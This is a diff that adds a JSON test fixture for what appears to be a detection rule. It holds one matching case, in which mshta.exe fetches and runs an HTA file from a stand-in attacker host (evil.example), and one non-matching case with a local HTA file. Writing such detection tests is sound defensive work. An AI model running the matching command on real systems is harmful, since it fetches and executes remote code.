@@ -1,0 +1,14 @@
+{
+  "should_match": [
+    {
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe https://evil.example/payload.hta"
+    }
+  ],
+  "should_not_match": [
+    {
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe C:\\apps\\legacy\\form.hta"
+    }
+  ]
+}
